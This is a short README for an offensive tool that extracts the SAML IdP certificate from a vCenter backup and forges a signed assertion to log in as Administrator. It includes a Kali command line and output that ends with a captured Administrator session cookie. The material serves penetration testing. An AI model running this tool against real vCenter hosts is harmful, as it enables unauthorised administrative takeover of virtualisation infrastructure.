# vCenter SAML Login Tool
A tool to extract the IdP cert from vCenter backups and log in as Administrator

If you'd like to know more about several use cases for this tool and how we've used it to gain Administrative access to vCenter hosts check out our blog post: https://horizon3.ai/vcenter_saml_login

## Usage
```
root@kali:~/vcenter# python3 vcenter_saml_login.py -p data.mdb -t 10.0.100.200
[*] Successfully extracted the IdP certificate
[*] Successfully extracted trusted certificate 1
[*] Successfully extracted trusted certificate 2
[*] Obtaining hostname from vCenter SSL certificate
[*] Found hostname vcsa.olympus for 10.0.100.200
[*] Initiating SAML request with 10.0.100.200
[*] Generating SAML assertion
[*] Signing the SAML assertion
[*] Attempting to log into vCenter with the signed SAML request
[+] Successfuly obtained Administrator cookie for 10.0.100.200!
[+] Cookie: VSPHERE-UI-JSESSIONID=06D1630719B4DE33A4CE653458911640
```

## Demonstration
![](vcenter.gif)
